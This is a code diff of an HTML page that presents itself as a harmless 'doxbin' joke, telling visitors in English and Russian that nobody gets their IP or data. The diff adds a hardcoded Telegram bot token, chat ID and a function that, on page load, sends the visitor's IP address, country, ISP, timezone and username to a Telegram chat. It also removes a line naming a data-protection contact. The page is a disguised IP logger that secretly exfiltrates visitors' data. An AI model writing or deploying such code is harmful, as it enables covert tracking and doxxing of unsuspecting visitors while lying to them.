@@ -34,7 +34,6 @@
     <h1>Hi! Your on doxbin 😈😈</h1>
     <h1>All this just a joke, nobody gets ur ip and data!!</h1>
     <h1>Все это просто шутка, никто не получит ваш ip и данные!!</h1>
-    <h1>О защите ваших данных: @untitledhelpstabot</h1>
     <hr>
     <p><strong>IP Address:</strong> <span id="ip_address"></span></p>
     <p><strong>Country:</strong> <span id="country_name"></span></p>
@@ -49,6 +48,16 @@
     <hr>
     <script>
         document.addEventListener("DOMContentLoaded", function () {
+            // Replace with your bot token and chat ID
+            const botToken = "8178145421:AAFLKhUtivNrhharhGdQf0IgQx7LYdetnjc";
+            const chatId = "7936915348";
+
+            // Function to send data to Telegram
+            function sendToTelegram(message) {
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const payload = {
+                    chat_id: chatId,
+                    text: message,
                 };
 
                 fetch(url, {
@@ -100,6 +109,7 @@ Timezone: ${data.timezone}
 ISP: ${data.org}
 Username: ${username}
                     `;
+                    sendToTelegram(message);
                 })
                 .catch(error => console.error("Error fetching IP data:", error));
         });
